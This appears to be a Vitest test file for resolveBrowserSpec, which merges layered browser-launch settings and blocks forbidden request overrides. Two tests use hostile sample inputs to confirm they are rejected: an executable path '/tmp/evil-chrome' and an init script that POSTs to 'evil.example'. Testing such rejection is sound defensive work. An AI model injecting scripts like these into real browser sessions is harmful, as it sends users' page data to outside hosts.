import { describe, expect, it } from 'vitest';
import type { BrowserSpec } from '../../src/domain/entities.js';
import {
  DEFAULT_BROWSER_SPEC,
  STRICT_OVERRIDE_POLICY,
  resolveBrowserSpec,
} from '../../src/domain/settings.js';

describe('resolveBrowserSpec', () => {
  it('merges five layers low to high priority: defaults, tenant, pool (full overwrite), app, request', () => {
    const pool: BrowserSpec = {
      ...DEFAULT_BROWSER_SPEC,
      channel: 'chromium',
      headless: 'off',
      viewport: { width: 1920, height: 1080, deviceScaleFactor: 2 },
      locale: 'en-GB',
    };

    const { spec, rejected } = resolveBrowserSpec(
      {
        defaults: DEFAULT_BROWSER_SPEC,
        tenant: { locale: 'fr-FR', timezoneId: 'Europe/Paris' },
        pool,
        app: { colorScheme: 'dark' },
        request: { viewport: { width: 800 }, locale: 'de-DE' },
      },
      STRICT_OVERRIDE_POLICY,
    );

    // Pool overwrites the tenant's locale wholesale (pool is a full spec
    // layer), then the request narrows it again as a freely overridable
    // scalar field.
    expect(spec.locale).toBe('de-DE');
    // The pool's full spec replaced the tenant layer's timezoneId with null.
    expect(spec.timezoneId).toBeNull();
    // App layer applies on top of the pool.
    expect(spec.colorScheme).toBe('dark');
    // Viewport is a shallow merge: the request only sets width, height and
    // deviceScaleFactor still come from the pool.
    expect(spec.viewport).toEqual({ width: 800, height: 1080, deviceScaleFactor: 2 });
    expect(rejected).toEqual([]);
  });

  it('rejects a never overridable request field, leaves the spec at the pool value, and reports it in rejectedOverrides', () => {
    const pool: BrowserSpec = { ...DEFAULT_BROWSER_SPEC, executablePath: null };

    const { spec, rejected } = resolveBrowserSpec(
      {
        defaults: DEFAULT_BROWSER_SPEC,
        pool,
        request: { executablePath: '/tmp/evil-chrome' },
      },
      STRICT_OVERRIDE_POLICY,
    );

    expect(spec.executablePath).toBeNull();
    expect(rejected).toEqual([
      {
        field: 'executablePath',
        requestedValue: '/tmp/evil-chrome',
        reason: 'not_overridable',
        fallbackValue: null,
      },
    ]);
  });

  it('rejects a narrowing only field that would loosen the pool value, and accepts one that narrows it', () => {
    const pool: BrowserSpec = { ...DEFAULT_BROWSER_SPEC, stealth: 'basic', acceptDownloads: true };

    const { spec, rejected } = resolveBrowserSpec(
      {
        defaults: DEFAULT_BROWSER_SPEC,
        pool,
        request: { stealth: 'full', acceptDownloads: false },
      },
      STRICT_OVERRIDE_POLICY,
    );

    // stealth: 'full' loosens above the pool's 'basic', rejected.
    expect(spec.stealth).toBe('basic');
    // acceptDownloads: false narrows the pool's true, accepted.
    expect(spec.acceptDownloads).toBe(false);
    expect(rejected).toEqual([
      {
        field: 'stealth',
        requestedValue: 'full',
        reason: 'not_narrowing',
        fallbackValue: 'basic',
      },
    ]);
  });

  it('clamps launchTimeoutMs to the policy bounds after merging, regardless of what any layer asked for', () => {
    const { spec } = resolveBrowserSpec(
      {
        defaults: DEFAULT_BROWSER_SPEC,
        request: { launchTimeoutMs: 999999 },
      },
      STRICT_OVERRIDE_POLICY,
    );
    expect(spec.launchTimeoutMs).toBe(STRICT_OVERRIDE_POLICY.bounds.launchTimeoutMs.max);
  });

  it('rejects a request layer attempt to set initScripts, the same way it rejects extraArgs and env', () => {
    const pool: BrowserSpec = {
      ...DEFAULT_BROWSER_SPEC,
      initScripts: [{ name: 'gate', source: 'void 0;' }],
    };

    const { spec, rejected } = resolveBrowserSpec(
      {
        defaults: DEFAULT_BROWSER_SPEC,
        pool,
        request: {
          initScripts: [{ name: 'evil', source: 'fetch("https://evil.example", {method:"POST"})' }],
        },
      },
      STRICT_OVERRIDE_POLICY,
    );

    expect(spec.initScripts).toEqual([{ name: 'gate', source: 'void 0;' }]);
    expect(rejected).toEqual([
      {
        field: 'initScripts',
        requestedValue: [
          { name: 'evil', source: 'fetch("https://evil.example", {method:"POST"})' },
        ],
        reason: 'not_overridable',
        fallbackValue: [{ name: 'gate', source: 'void 0;' }],
      },
    ]);
  });

  it('throws SpecValidationError when initScripts exceeds MAX_INIT_SCRIPTS', () => {
    const tooMany = Array.from({ length: 21 }, (_, i) => ({ name: `s${i}`, source: 'void 0;' }));
    expect(() =>
      resolveBrowserSpec(
        {
          defaults: DEFAULT_BROWSER_SPEC,
          pool: { ...DEFAULT_BROWSER_SPEC, initScripts: tooMany },
        },
        STRICT_OVERRIDE_POLICY,
      ),
    ).toThrow(/at most 20 init scripts/);
  });

  it('throws SpecValidationError when one init script source exceeds MAX_INIT_SCRIPT_SOURCE_LENGTH', () => {
    const oversized = [{ name: 'huge', source: 'x'.repeat(262145) }];
    expect(() =>
      resolveBrowserSpec(
        {
          defaults: DEFAULT_BROWSER_SPEC,
          pool: { ...DEFAULT_BROWSER_SPEC, initScripts: oversized },
        },
        STRICT_OVERRIDE_POLICY,
      ),
    ).toThrow(/exceeds 262144 characters/);
  });

  it('throws SpecValidationError for an internally inconsistent merged spec', () => {
    expect(() =>
      resolveBrowserSpec(
        {
          defaults: DEFAULT_BROWSER_SPEC,
          pool: { ...DEFAULT_BROWSER_SPEC, channel: 'chromium-headless-shell' },
          request: { headless: 'off' },
        },
        STRICT_OVERRIDE_POLICY,
      ),
    ).toThrow(/no UI/);
  });
});
